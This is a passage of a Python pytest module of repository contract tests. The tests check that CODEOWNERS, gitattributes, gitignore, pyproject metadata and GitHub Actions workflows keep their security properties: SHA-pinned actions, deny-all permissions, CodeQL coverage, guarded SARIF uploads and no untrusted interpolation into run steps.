"""Repository contract tests for repo hygiene gating files.

Config-only changes are normally untestable, yet deleting or weakening one of
the files asserted here removes a real safety property with no visible symptom:

- ``.github/CODEOWNERS`` losing its wildcard line silently stops every path
  from requiring review.
- ``.gitattributes`` going missing leaves line-ending normalisation undefined
  across platforms, so the same file content diffs differently per machine.
- ``.gitignore`` losing the council rule lets a regenerated council artifact
  back into a commit, which permanently reddens the gitleaks pre-push gate
  because that hook scans the full git history rather than the working tree.
- ``pyproject.toml`` keeping the ``hatchling`` scaffolding description
  publishes ``Add your description here`` to every index that reads the
  built metadata, and no build or lint step complains about it.
- ``pyproject.toml`` advertising a ``requires-python`` floor below the
  interpreter the repo is actually pinned to claims support for a release that
  neither the linter, the type checker, nor the CI matrix ever exercises.
- a workflow under ``.github/workflows/`` dropping its ``permissions`` or
  ``concurrency`` block: an absent ``permissions`` block silently inherits
  whatever the repository default happens to be, and an absent ``concurrency``
  block lets superseded runs pile up instead of cancelling each other.
- a third-party ``uses:`` falling back to a mutable tag or branch: whoever
  controls the tag controls the code CI runs, and the 40-hex pin plus its
  trailing version comment is what keeps that boundary immutable while keeping
  the jump reviewable.
- ``ci-status-checker`` losing a job id from its ``needs``: ``CI Status`` is the
  single required status check, so a job omitted from ``needs`` quietly stops
  gating merges, with no symptom in the Actions UI, the ruleset, or a red build.
- a ``run:`` body interpolating ``${{ github.event.pull_request.* }}``: a
  ``run:`` body is evaluated as a shell script, so an attacker-controlled
  branch name or PR title becomes command injection rather than data.
- the ``detect-changes`` path filters dropping a path they claim to guard: the
  ``CI Status`` gate is fail-closed, so an under-specified filter skips exactly
  the jobs that should have run.
- a scheduled security workflow losing its own ``concurrency`` group:
  ``cancel-in-progress`` is evaluated on the *arriving* run, so a scheduled scan
  sharing a group with ordinary pushes is killed by the next push, and a security
  scan that silently never completes is worse than one that fails, because
  nothing reports it.
- a SARIF upload becoming reachable from a pull-request run: Scorecard's
  ``pull_request`` runs are ``supply-chain/local`` and omit the
  ``branch-protection`` and ``online-scm`` categories, so uploading them
  overwrites the default-branch baseline and emits a "configurations not found"
  warning on every PR, which trains reviewers to ignore code-scanning warnings.
- ``zizmor.yml``'s deny-all ``permissions: {}`` being widened to
  ``permissions: write-all``, which hands every job in the file full write
  access, including a job added later that nobody reviewed.
- a checkout appearing in a ``pull_request_target`` / ``workflow_run`` workflow:
  those triggers run with a write token against attacker-influenceable code, so
  a checkout plus a build or test step is a remote-code-execution path.
- CodeQL's matrix losing the ``actions`` language, or its ``init`` step falling
  back to the default query suite: the workflow files are the highest-value
  attack surface in this repository, and ``security-and-quality`` is the
  default suite and does *not* satisfy this.

Every assertion below is derived from file contents or from a real ``git``
subprocess run, so each one can be observed to fail under a targeted mutation.
"""

from __future__ import annotations

import re
import shutil

# This module must ask git directly, so `subprocess` is unavoidable. Every call
# below uses a fixed argv, `shell=False`, and no interpolated user input.
import subprocess  # ruff: ignore[suspicious-subprocess-import]
import tomllib
from pathlib import Path

import pytest
import yaml

ALWAYS_CONDITION = "always()"
CHECKOUT_ACTION = "actions/checkout"
CODEOWNERS_WILDCARD = "* @iamwatchdogs"
CODEQL_ANALYZE_ACTION = "github/codeql-action/analyze"
CODEQL_INIT_ACTION = "github/codeql-action/init"
CODEQL_UPLOAD_SARIF_ACTION = "github/codeql-action/upload-sarif"
COMMIT_SHA_RE = re.compile(r"[0-9a-f]{40}")
CODEQL_WORKFLOW_FILE = "codeql.yml"
COUNCIL_ARTIFACT = Path(".agents/council/extraction-candidates.jsonl")
# Exactly the two events zizmor's `dangerous-triggers` audit flags, and exactly
# the two that run with a write token against code an attacker can influence.
# `workflow_dispatch` is deliberately absent: zizmor v1.30.1 does not flag it,
# and it is only runnable by a principal who already holds write access, so it
# is not a path from untrusted code. Requiring the ignore comment there would
# demand a comment silencing an audit that never fires.
DANGEROUS_TRIGGERS = frozenset({"pull_request_target", "workflow_run"})
DEFAULT_ASSIGNEE_WORKFLOW_FILE = "default-assignee.yml"
ENV_KEY = "env"
EVENT_NAME_REFERENCE = "github.event_name"
EXPECTED_PATH_FILTERS = frozenset({"json", "python", "workflows"})
GIT_ATTRIBUTES_RULE = "* text=auto eol=lf"
LOCAL_ACTION_PREFIXES = ("./", ".\\", "docker://")
MIN_DESCRIPTION_LENGTH = 20
NEGATION = "!"
PATHS_FILTER_ACTION = "dorny/paths-filter"
PULL_REQUEST_TRIGGER = "pull_request"
PYPROJECT_MANIFEST = Path("pyproject.toml")
PYTHON_VERSION_PIN = Path(".python-version")
QUOTED_TRIGGER_KEY = "on"
REQUIRED_CODEQL_LANGUAGES = frozenset({"actions", "python"})
# `security-and-quality` is CodeQL's default suite and does not satisfy this;
# `security-extended` is the only value that widens it.
REQUIRED_CODEQL_QUERY_SUITE = "security-extended"
REQUIRED_PYTHON_FILTER_PATHS = ("pyproject.toml", "uv.lock")
REQUIRED_REQUIRES_PYTHON = ">=3.14"
REQUIRED_STATUS_CHECK_NAME = "CI Status"
REQUIRED_WORKFLOWS_FILTER_PATH = ".github/workflows/*.yml"
RUN_KEY = "run"
RUN_SUFFIX = f".{RUN_KEY}"
SCAFFOLD_PLACEHOLDER_DESCRIPTION = "Add your description here"
# One literal, two uses: the `schedule:` trigger key, and the substring the
# `concurrency` group must carry so a scheduled run lands in its own group.
SCHEDULE_LITERAL = "schedule"
# The two weekly security scans. Named explicitly so that dropping either
# `schedule:` trigger is a failure rather than a silent narrowing of coverage.
SCHEDULED_SECURITY_WORKFLOW_FILES = frozenset({"codeql.yml", "scorecard.yml"})
TRIGGER_KEY = True  # PyYAML (YAML 1.1) resolves the bare key `on` to `True`.
UNTRUSTED_INPUT_RE = re.compile(
    r"\$\{\{\s*github\.event\.(?:pull_request|issue)\b[^{}]*\}\}"
)
VERSION_COMMENT_RE = re.compile(r"v\d[\w.+-]*")
WITH_KEY = "with"
WORKFLOW_EXPRESSION_RE = re.compile(r"\$\{\{[^{}]*\}\}")
WORKFLOWS_DIR = Path(".github/workflows")
WRITE_ALL_PERMISSIONS = "write-all"
ZIZMOR_DANGEROUS_TRIGGERS_COMMENT = "zizmor: ignore[dangerous-triggers]"
ZIZMOR_JOB_ID = "zizmor"
ZIZMOR_WORKFLOW_FILE = "zizmor.yml"

# Matched against the raw line so the trailing comment requirement is actually
# observable. Parsing alone would discard the comment entirely, and a bare
# `@v4` is a perfectly legal reference that must still fail.
USES_LINE_RE = re.compile(
    r"^\s*(?:-\s+)?uses:\s*(?P<reference>\S+)(?:\s+#\s*(?P<comment>\S+))?\s*$"
)

# The same reasoning as `USES_LINE_RE`, for the same reason: the trailing
# `# zizmor: ignore[dangerous-triggers]` has to be asserted against raw text,
# because parsing discards it and the requirement would become untestable. `#`
# is not a legal capture for `name`, so neither a commented-out trigger line nor
# a comment that merely names a trigger can match.
TRIGGER_KEY_LINE_RE = re.compile(
    r"^\s*(?P<name>[A-Za-z_][A-Za-z0-9_-]*)\s*:(?P<rest>.*)$"
)

# The deny-all workflow-level block must survive as an *empty* mapping. `{}` is
# the only spelling of "deny everything, grant per job"; a `permissions:` key
# with a body silently re-grants whatever it names.
REQUIRED_DENY_ALL_PERMISSIONS: dict[str, str] = {}

# What the `zizmor` job must re-grant to replace that deny-all default:
# `security-events: write` to upload findings, `contents: read` to check out the
# workflow files it is analysing. Asserted as a subset so a job may legitimately
# grant more (this one also reads workflow metadata via `actions: read`).
REQUIRED_ZIZMOR_JOB_PERMISSIONS: dict[str, str] = {
    "security-events": "write",
    "contents": "read",
}


@pytest.fixture(scope="session")
def repo_root() -> Path:
    """Locate the repository root by walking up from this test file.

    Returns:
        The first ancestor directory of this file that holds a
        ``pyproject.toml``, which is this repository's root.

    Raises:
        RuntimeError: If no ancestor directory holds a ``pyproject.toml``.
    """
    for candidate in Path(__file__).resolve().parents:
        if (candidate / "pyproject.toml").is_file():
            return candidate
    msg = f"no pyproject.toml found in any parent of {__file__}"
    raise RuntimeError(msg)


def _workflow_paths(repo_root: Path) -> list[Path]:
    """List every workflow definition under ``.github/workflows``.

    The directory is walked rather than hardcoded to ``ci.yml`` because further
    workflows are added over time, and a test that only ever inspects one file
    would keep passing while a new workflow violated every rule below.

    Args:
        repo_root: The repository root.

    Returns:
        Every ``*.yml`` and ``*.yaml`` file below ``.github/workflows``, sorted
        so failure messages are stable between runs.
    """
    workflows_dir = repo_root / WORKFLOWS_DIR
    found = sorted({*workflows_dir.rglob("*.yml"), *workflows_dir.rglob("*.yaml")})
    assert found, (
        f"{workflows_dir} holds no workflow files, so every workflow contract "
        "below would pass without inspecting anything"
    )
    return found


def _as_mapping(node: object, label: str) -> dict[object, object]:
    """Re-type a parsed YAML mapping so the gradual type stays contained.

    PyYAML ships no type information, so every node it returns is gradual.
    Re-typing at this single boundary keeps that from propagating into the
    assertions and into the type checker, while still failing loudly if the
    node is not a mapping at all.

    Args:
        node: The node to interpret as a mapping.
        label: What the node is meant to be, used in the failure message.

    Returns:
        The same mapping, typed as ``dict[object, object]``.
    """
    assert isinstance(node, dict), (
        f"{label} is not a mapping (got {type(node).__name__})"
    )
    # The explicit key/value rebuild is deliberate rather than incidental.
    # `dict(node)`, `mapping.update(node)` and `dict(node.items())` are
    # equivalent at runtime, but each widens PyYAML's gradual key and value
    # types, and only this form lands in `dict[object, object]`. The
    # suppression is on the rewrite ruff would otherwise suggest, which the
    # type checker then rejects -- a rewrite that trades a lint for a type
    # error is not an improvement.
    return {  # ruff: ignore[unnecessary-comprehension]
        key: value for key, value in node.items()
    }


def _load_workflow(path: Path) -> dict[object, object]:
    """Parse a workflow file into its top-level mapping.

    Args:
        path: The workflow file to parse.

    Returns:
        The parsed top-level mapping, with keys exactly as PyYAML produced them.
    """
    return _as_mapping(yaml.safe_load(path.read_text(encoding="utf-8")), str(path))


def _trigger_value(data: dict[object, object]) -> object:
    """Return a workflow's parsed ``on:`` value under either YAML 1.1 spelling.

    PyYAML implements YAML 1.1, in which the bare key ``on`` is the boolean
    ``True`` rather than the string ``"on"``. A quoted ``"on"`` stays a string.
    Both spellings declare the same trigger, so neither is mistaken for a
    missing one; the key is never renamed on disk to work around this.

    Args:
        data: A parsed workflow mapping.

    Returns:
        The trigger value, or ``None`` when no trigger is declared.
    """
    if TRIGGER_KEY in data:
        return data[TRIGGER_KEY]
    return data.get(QUOTED_TRIGGER_KEY)


def _workflow_jobs(
    data: dict[object, object], path: Path
) -> dict[str, dict[object, object]]:
    """Return a workflow's jobs, keyed by job id.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The ``jobs:`` mapping with stringified job ids.
    """
    jobs = _as_mapping(data.get("jobs"), f"`jobs:` in {path}")
    typed: dict[str, dict[object, object]] = {}
    for key, value in jobs.items():
        job = _as_mapping(value, f"job {key!r} in {path}")
        typed[str(key)] = job
    return typed


def _job_steps(job: dict[object, object]) -> list[dict[object, object]]:
    """Return the step mappings declared by one job.

    Args:
        job: A parsed job mapping.

    Returns:
        Every mapping in the job's ``steps:`` list, or an empty list when the
        job declares no steps.
    """
    steps = job.get("steps")
    if not isinstance(steps, list):
        return []
    return [_as_mapping(step, "a step") for step in steps if isinstance(step, dict)]


def _needed_job_ids(needs: object) -> set[str]:
    """Normalise a job's ``needs:`` value into a set of job ids.

    GitHub accepts a bare id, a comma-separated string, a list, or a mapping of
    id to result condition, so all four are collapsed to the same set here.

    Args:
        needs: The raw ``needs:`` value.

    Returns:
        The referenced job ids, empty when the value is not a usable form.
    """
    if isinstance(needs, str):
        return {part.strip() for part in needs.split(",") if part.strip()}
    if isinstance(needs, dict):
        return {str(key) for key in needs}
    if isinstance(needs, list):
        return {str(item) for item in needs}
    return set()


def _normalise_expression(text: str) -> str:
    """Strip the ``${{ }}`` wrapper and collapse whitespace from an expression.

    Args:
        text: A raw ``if:`` value from a parsed workflow.

    Returns:
        The expression body, so ``${{ always() }}`` and ``always()`` compare
        equal.
    """
    stripped = text.strip()
    if stripped.startswith("${{") and stripped.endswith("}}"):
        stripped = stripped[3:-2]
    return " ".join(stripped.split())


def _is_third_party_action(reference: str) -> bool:
    """Report whether a ``uses:`` value names a separately published action.

    ``./path`` and ``.\\path`` are checked-out local actions and ``docker://``
    values are container images. Neither is an action repository, and neither
    takes a commit SHA, so neither is subject to the pinning rule.

    Args:
        reference: The right-hand side of a ``uses:`` line.

    Returns:
        True when the reference names a third-party ``owner/repo@ref`` action.
    """
    if reference.startswith(LOCAL_ACTION_PREFIXES):
        return False
    return "/" in reference


def _pin_problems(reference: str, comment: str | None) -> list[str]:
    """Describe why a third-party ``uses:`` reference is not correctly pinned.

    Args:
        reference: The right-hand side of the ``uses:`` line.
        comment: The trailing ``# ...`` comment on that line, if it has one.

    Returns:
        One message per violated rule, empty when the pin is already correct.
    """
    owner_repo, separator, revision = reference.rpartition("@")
    if not separator or not owner_repo:
        return ["no `@` revision at all, so the reference is unpinned"]
    problems: list[str] = []
    if not COMMIT_SHA_RE.fullmatch(revision):
        problems.append(
            f"revision {revision!r} is not a 40-character lowercase-hex commit "
            "SHA, so it is a mutable tag or branch"
        )
    if comment is None:
        problems.append("the line carries no `# vX.Y.Z` version comment")
    elif not VERSION_COMMENT_RE.fullmatch(comment):
        problems.append(
            f"trailing comment {comment!r} is not a `# vX.Y.Z` version comment"
        )
    return problems


def _interpolation_sites(
    node: object, location: str, *, in_env: bool
) -> list[tuple[str, str, bool]]:
    """Find every ``${{ ... }}`` expression in a parsed workflow.

    The walk is structural rather than textual so ``in_env`` is derived from
    the actual YAML path: an expression is only considered safely quoted when it
    sits in a value of a mapping whose key is ``env``, at job level or step
    level. Everything else -- a ``run:`` body, a step ``name:``, an ``if:``, a
    ``with:`` input -- is reported.

    Args:
        node: The current YAML node, of any type.
        location: Dotted path of ``node`` within the workflow, for messages.
        in_env: Whether an enclosing mapping key was ``env``.

    Returns:
        One ``(location, text, in_env)`` triple per string scalar that
        interpolates an expression.
    """
    if isinstance(node, str):
        return [(location, node, in_env)] if WORKFLOW_EXPRESSION_RE.search(node) else []
    if isinstance(node, dict):
        found: list[tuple[str, str, bool]] = []
        for key, value in node.items():
            child = f"{location}.{key}" if location else str(key)
            found.extend(
                _interpolation_sites(value, child, in_env=in_env or key == ENV_KEY)
            )
        return found
    if isinstance(node, list):
        found = []
        for index, value in enumerate(node):
            found.extend(
                _interpolation_sites(value, f"{location}[{index}]", in_env=in_env)
            )
        return found
    return []


def _filter_paths(parsed: object, filter_name: str) -> set[str]:
    """Return the path globs declared for one named ``paths-filter`` filter.

    Args:
        parsed: The decoded ``filters:`` mapping.
        filter_name: The filter whose globs are wanted.

    Returns:
        Every glob declared under ``filter_name``, or an empty set when the
        filter is absent or is not a list of globs.
    """
    if not isinstance(parsed, dict):
        return set()
    globs = parsed.get(filter_name)
    if not isinstance(globs, list):
        return set()
    return {str(glob) for glob in globs}


def _paths_filter_blocks(repo_root: Path) -> list[tuple[str, object]]:
    """Locate every ``dorny/paths-filter`` step and decode its ``filters:``.

    Args:
        repo_root: The repository root.

    Returns:
        One ``(site, parsed)`` pair per path-filter step, where ``site`` names
        the file, job and step and ``parsed`` is the decoded filter mapping.
    """
    blocks: list[tuple[str, object]] = []
    for path in _workflow_paths(repo_root):
        jobs = _workflow_jobs(_load_workflow(path), path)
        for job_id, job in jobs.items():
            for index, step in enumerate(_job_steps(job)):
                if not str(step.get("uses", "")).startswith(PATHS_FILTER_ACTION):
                    continue
                site = f"{path.relative_to(repo_root)}::{job_id}::step[{index}]"
                with_block = step.get("with")
                assert isinstance(with_block, dict), (
                    f"{site} runs {PATHS_FILTER_ACTION} with no `with:` block, so "
                    "it filters nothing and every downstream job is skipped"
                )
                filters = with_block.get("filters")
                assert isinstance(filters, str), (
                    f"{site} declares a non-string `filters:` value ({filters!r}); "
                    f"{PATHS_FILTER_ACTION} requires a YAML string of filters"
                )
                blocks.append((site, yaml.safe_load(filters)))
    return blocks


def _step_sites(
    data: dict[object, object], path: Path
) -> list[tuple[str, dict[object, object]]]:
    """Return every step of every job in one workflow, paired with its site.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used to build site labels.

    Returns:
        One ``(site, step)`` pair per declared step, where ``site`` reads
        ``<file name>::<job id>::step[<index>]`` so a failure names the exact
        step. The bare file name is enough to disambiguate, and it keeps a
        failure message readable instead of burying the step under an
        absolute path.
    """
    sites: list[tuple[str, dict[object, object]]] = []
    for job_id, job in _workflow_jobs(data, path).items():
        sites.extend(
            (f"{path.name}::{job_id}::step[{index}]", step)
            for index, step in enumerate(_job_steps(job))
        )
    return sites


def _step_uses(step: dict[object, object]) -> str:
    """Return a step's ``uses:`` reference, or an empty string when it has none.

    Args:
        step: A parsed step mapping.

    Returns:
        The right-hand side of ``uses:``, which may be empty for a ``run:`` step.
    """
    value = step.get("uses")
    return value if isinstance(value, str) else ""


def _references_action(reference: str, action: str) -> bool:
    """Report whether a ``uses:`` value names a particular action.

    The reference is compared against the bare action path, so a SHA-pinned
    ``owner/repo@<40-hex>`` and a tag-pinned ``owner/repo@v1`` both match, and
    a different action that merely shares a prefix (``.../upload-sarif`` versus
    ``.../upload-sarif-something``) does not.

    Args:
        reference: The right-hand side of a ``uses:`` line.
        action: The action repository path, without any ``@ref`` suffix.

    Returns:
        True when the reference names exactly that action.
    """
    return reference == action or reference.startswith(f"{action}@")


def _trigger_keys(data: dict[object, object]) -> set[str]:
    """Return the set of event names a workflow declares under ``on:``.

    Args:
        data: A parsed workflow mapping.

    Returns:
        Every declared event name, empty when the workflow has no trigger or
        declares it as a bare sequence rather than a mapping.
    """
    triggers = _trigger_value(data)
    if not isinstance(triggers, dict):
        return set()
    return {str(key) for key in triggers}


def _has_bare_trigger(data: dict[object, object], event: str) -> bool:
    """Report whether a workflow triggers on ``event`` with no filter at all.

    A bare ``pull_request:`` fires on every pull request. A qualified one such
    as ``pull_request: {branches: [main]}`` is filtered, which is the
    distinction the SARIF contract below depends on.

    Args:
        data: A parsed workflow mapping.
        event: The event name to look for.

    Returns:
        True when ``event`` is present and maps to nothing meaningful.
    """
    triggers = _trigger_value(data)
    if not isinstance(triggers, dict):
        return False
    mapping = _as_mapping(triggers, f"the `on:` block, looking for {event!r}")
    if event not in mapping:
        return False
    value = mapping[event]
    return value is None or (isinstance(value, (dict, list)) and not value)


def _publishes_sarif(step: dict[object, object]) -> bool:
    """Report whether a step uploads SARIF to GitHub code scanning.

    Both ``upload-sarif`` and ``analyze`` write findings to the code-scanning
    API; ``analyze`` does so implicitly as its final act, so a workflow using
    only ``analyze`` still overwrites the SARIF baseline of its category.

    Args:
        step: A parsed step mapping.

    Returns:
        True when the step pushes findings into the code-scanning service.
    """
    reference = _step_uses(step)
    return _references_action(reference, CODEQL_UPLOAD_SARIF_ACTION) or (
        _references_action(reference, CODEQL_ANALYZE_ACTION)
    )


def _excludes_pull_request(condition: str) -> bool:
    """Report whether an ``if:`` expression blocks pull-request runs.

    Both halves are required. The event name must appear, so a condition such
    as ``github.event_name == 'schedule'`` cannot be mistaken for a guard, and a
    negation must appear, so a condition that merely *mentions* the event
    positively (``github.event_name == 'pull_request'``) is rejected.

    Args:
        condition: A normalised ``if:`` expression body.

    Returns:
        True when the expression names ``pull_request`` and negates it.
    """
    return PULL_REQUEST_TRIGGER in condition and NEGATION in condition


def _checkout_sites(data: dict[object, object], path: Path) -> list[str]:
    """Return the sites of every ``actions/checkout`` step in one workflow.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in site labels.

    Returns:
        One site label per checkout step, empty when the workflow never checks
        out a working tree.
    """
    return [
        site
        for site, step in _step_sites(data, path)
        if _references_action(_step_uses(step), CHECKOUT_ACTION)
    ]


def _trigger_source_lines(path: Path, events: set[str]) -> dict[str, str]:
    """Return the raw source line each named trigger is declared on.

    Args:
        path: The workflow file to scan.
        events: Trigger names to look for.

    Returns:
        The first raw line per trigger name, which is where a trailing
        ``# ...`` comment would live if one were present.
    """
    found: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        match = TRIGGER_KEY_LINE_RE.match(line)
        if match is None:
            continue
        name = match.group("name")
        if name in events:
            found.setdefault(name, line)
    return found


def _matrix_languages(data: dict[object, object], path: Path) -> set[str]:
    """Collect every ``language`` value declared in a workflow's matrix.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The distinct languages named by any job's ``strategy.matrix.include``
        entries, empty when no job declares such a matrix.
    """
    languages: set[str] = set()
    for job in _workflow_jobs(data, path).values():
        strategy = job.get("strategy")
        if not isinstance(strategy, dict):
            continue
        matrix = strategy.get("matrix")
        if not isinstance(matrix, dict):
            continue
        include = matrix.get("include")
        if not isinstance(include, list):
            continue
        for entry in include:
            if not isinstance(entry, dict):
                continue
            mapping = _as_mapping(entry, f"a `strategy.matrix.include` entry in {path}")
            if "language" in mapping:
                languages.add(str(mapping["language"]))
    return languages


def _init_query_suites(data: dict[object, object], path: Path) -> list[object]:
    """Collect the ``queries:`` value of every ``codeql-action/init`` step.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The raw ``queries`` values, empty when no ``init`` step sets one. An
        unset value is a distinct outcome from a set one, because an unset
        ``queries:`` means CodeQL falls back to its own default suite.
    """
    suites: list[object] = []
    for _site, step in _step_sites(data, path):
        if not _references_action(_step_uses(step), CODEQL_INIT_ACTION):
            continue
        with_block = step.get(WITH_KEY)
        if not isinstance(with_block, dict):
            continue
        mapping = _as_mapping(with_block, f"a `with:` block in {path}")
        if "queries" in mapping:
            suites.append(mapping["queries"])
    return suites


def test_codeowners_gates_every_path_behind_one_owner(repo_root: Path) -> None:
    """Assert ``.github/CODEOWNERS`` claims the whole repository.

    Args:
        repo_root: The repository root, used to locate ``.github/CODEOWNERS``.
    """
    codeowners = repo_root / ".github" / "CODEOWNERS"
    assert codeowners.is_file(), f"required gating file is missing: {codeowners}"

    owner_lines = [
        stripped
        for line in codeowners.read_text(encoding="utf-8").splitlines()
        if (stripped := line.strip()) and not stripped.startswith("#")
    ]

    assert owner_lines, (
        f"{codeowners} declares no owner line, so nothing in the repository "
        "requires review; add a line reading "
        f"{CODEOWNERS_WILDCARD!r}"
    )
    assert owner_lines[0] == CODEOWNERS_WILDCARD, (
        f"the first owner line of {codeowners} is {owner_lines[0]!r}, expected "
        f"the whole-repo wildcard {CODEOWNERS_WILDCARD!r}; a narrower or "
        "differently-owned first line leaves paths ungated"
    )


def test_gitattributes_pins_every_text_file_to_lf(repo_root: Path) -> None:
    """Assert ``.gitattributes`` pins line endings to LF for all text files.

    Args:
        repo_root: The repository root, used to locate ``.gitattributes``.
    """
    gitattributes = repo_root / ".gitattributes"
    assert gitattributes.is_file(), f"required gating file is missing: {gitattributes}"

    rules = [
        line.strip() for line in gitattributes.read_text(encoding="utf-8").splitlines()
    ]
    assert GIT_ATTRIBUTES_RULE in rules, (
        f"{gitattributes} has no line exactly {GIT_ATTRIBUTES_RULE!r}; the "
        f"parsed rules were {rules!r}. A per-extension rule such as "
        "'*.py text=auto eol=lf' does not satisfy this, because the "
        "repository-wide rule is what makes normalisation total"
    )


def test_generated_council_artifact_is_never_committable(repo_root: Path) -> None:
    """Assert git itself reports the generated council file as ignored.

    This deliberately asks ``git`` instead of pattern-matching ``.gitignore``,
    so the assertion tracks the property that matters: the path cannot be
    staged. A weakened rule, or one whose glob no longer matches, fails here.

    Args:
        repo_root: The repository root, which is the working directory git is
            invoked in and the root its ignore rules are resolved against.
    """
    git = shutil.which("git")
    assert git is not None, "the git executable is not available on PATH"

    relative = COUNCIL_ARTIFACT.as_posix()
    completed = subprocess.run(  # ruff: ignore[subprocess-without-shell-equals-true]
        [git, "check-ignore", "--no-index", "-q", relative],
        cwd=repo_root,
        check=False,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 0, (
        f"git check-ignore --no-index exited {completed.returncode} for "
        f"{relative}, so that path is not ignored (0 means ignored, 1 means not "
        "ignored). The council extraction candidates file is regenerated on "
        "every council run and its SHA-256 dedup_key values trip gitleaks' "
        "generic-api-key rule, which scans full git history and would leave "
        f"the pre-push gate permanently red. {completed.stderr.strip()}"
    )


def test_project_description_is_not_the_scaffolding_placeholder(
    repo_root: Path,
) -> None:
    """Assert ``[project] description`` is real prose, not a ``hatchling`` stub.

    ``hatchling`` writes ``Add your description here`` into a freshly scaffolded
    manifest and no later build, lint or type check step objects to it, so the
    placeholder silently ships as the package's one-line summary. The comparison
    is case-insensitive because recasing the leading capital is the cheapest way
    to slip past a literal ``!=`` without actually writing a description.

    Args:
        repo_root: The repository root, used to locate ``pyproject.toml``.
    """
    manifest_path = repo_root / PYPROJECT_MANIFEST
    assert manifest_path.is_file(), f"required manifest is missing: {manifest_path}"

    project = tomllib.loads(manifest_path.read_text(encoding="utf-8"))["project"]
    description = project["description"]
    assert isinstance(description, str), (
        f"[project] description in {manifest_path} must be a string, got "
        f"{type(description).__name__} ({description!r})"
    )

    assert description.casefold() != SCAFFOLD_PLACEHOLDER_DESCRIPTION.casefold(), (
        f"[project] description in {manifest_path} is still the hatchling "
        f"scaffolding placeholder {description!r}; replace it with prose that "
        "describes what this package publishes"
    )

    stripped_description = description.strip()
    assert stripped_description, (
        f"[project] description in {manifest_path} is whitespace-only "
        f"({description!r}); it must carry actual text"
    )
    assert len(stripped_description) >= MIN_DESCRIPTION_LENGTH, (
        f"[project] description in {manifest_path} is "
        f"{len(stripped_description)} character(s) once stripped "
        f"({description!r}), which is below the {MIN_DESCRIPTION_LENGTH}-character "
        "floor, so it is a stub rather than a description"
    )


def test_requires_python_agrees_with_the_pinned_interpreter(repo_root: Path) -> None:
    """Assert the manifest's ``requires-python`` floor matches the pinned tools.

    ``.python-version`` is the local interpreter, ``[tool.ty.environment]
    python-version`` is what the type checker resolves against, ``[tool.ruff]
    target-version`` is what the linter assumes, and the CI matrix only runs
    3.14. This repository shipped exactly that drift: ``requires-python`` read
    ``>=3.13`` while ``.python-version``, ``[tool.ty.environment]
    python-version`` and ``[tool.ruff] target-version`` were all already
    ``3.14``/``py314``. The manifest therefore advertised 3.13 support that lint
    and type checking never verified, and no build, lint or type check step
    objected until the floor was reconciled against the pin.

    Args:
        repo_root: The repository root, used to locate ``pyproject.toml`` and
            ``.python-version``.
    """
    manifest_path = repo_root / PYPROJECT_MANIFEST
    version_path = repo_root / PYTHON_VERSION_PIN
    assert manifest_path.is_file(), f"required manifest is missing: {manifest_path}"
    assert version_path.is_file(), (
        f"required interpreter pin is missing: {version_path}"
    )

    project = tomllib.loads(manifest_path.read_text(encoding="utf-8"))["project"]
    requires_python = project["requires-python"]
    assert isinstance(requires_python, str), (
        f"[project] requires-python in {manifest_path} must be a string, got "
        f"{type(requires_python).__name__} ({requires_python!r})"
    )

    pinned_version = version_path.read_text(encoding="utf-8").strip()
    assert pinned_version, (
        f"{version_path} pins an empty interpreter version, so nothing "
        "reconciles the manifest floor against a real interpreter"
    )

    reconciled = f">={pinned_version}"
    assert requires_python == reconciled, (
        f"interpreter gates disagree: [project] requires-python in "
        f"{manifest_path} is {requires_python!r}, while {version_path} pins "
        f"{pinned_version!r}, which reconciles to {reconciled!r}. Exactly one of "
        f"those two files is wrong -- correct requires-python in "
        f"{manifest_path} or the pin in {version_path}, then re-check "
        "[tool.ruff] target-version and [tool.ty.environment] python-version"
    )

    assert requires_python == REQUIRED_REQUIRES_PYTHON, (
        f"[project] requires-python in {manifest_path} is {requires_python!r}, "
        f"expected {REQUIRED_REQUIRES_PYTHON!r}; the manifest floor must equal "
        "the interpreter that the linter, the type checker and CI actually use"
    )


def test_third_party_actions_are_sha_pinned_with_a_version_comment(
    repo_root: Path,
) -> None:
    """Assert every third-party ``uses:`` is an immutable SHA plus a version.

    A ``uses:`` value may name a mutable reference such as a tag (``@v4``) or a
    branch (``@main``). Whoever controls that tag controls the code this CI
    executes, and nothing in the workflow diff reveals the swap, because the tag
    is a perfectly legal reference that reads identically before and after. A
    40-character commit SHA is immutable, so the review that read the old line
    still describes the new one.

    The ``# vX.Y.Z`` comment is asserted against the raw line text rather than
    the parsed value, because parsing would discard the comment entirely and the
    requirement would silently become untestable. The comment is what makes the
    pin reviewable: Dependabot rewrites the SHA and relies on the comment to
    keep the jump legible, so dropping it destroys the audit trail even though
    it does not weaken the pin itself.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    inspected: list[str] = []
    offenders: list[str] = []
    for path in _workflow_paths(repo_root):
        for line_number, line in enumerate(
            path.read_text(encoding="utf-8").splitlines(), start=1
        ):
            match = USES_LINE_RE.match(line)
            if match is None:
                continue
            reference = match.group("reference")
            if not _is_third_party_action(reference):
                continue
            site = f"{path.relative_to(repo_root)}:{line_number}"
            inspected.append(f"{site} {reference}")
            problems = _pin_problems(reference, match.group("comment"))
            offenders.extend(f"{site} {reference}: {problem}" for problem in problems)

    assert inspected, (
        "no third-party `uses:` reference was found in any workflow under "
        f"{WORKFLOWS_DIR}, so SHA pinning is untested; at least one reference "
        "of the form `owner/repo@<40-hex-sha>` must exist for this to mean "
        "anything"
    )
    assert not offenders, (
        "third-party actions that are not SHA-pinned with a version comment:\n"
        + "\n".join(offenders)
        + "\nPin each to a 40-character lowercase-hex commit SHA and keep the "
        "`# vX.Y.Z` comment on the same line, so a mutable tag cannot change "
        "the code CI runs and Dependabot can still read the jump"
    )


def test_required_status_check_needs_every_other_job(repo_root: Path) -> None:
    """Assert the ``CI Status`` gate depends on every other job and always runs.

    The branch ruleset requires exactly one status check, ``CI Status``, which
    is implemented as a job that succeeds only when every applicable job
    succeeded. A job added to the workflow without also being added to
    ``needs`` therefore stops gating merges, and there is no symptom anywhere:
    not a red build, not a changed Actions UI, not a different ruleset. That is
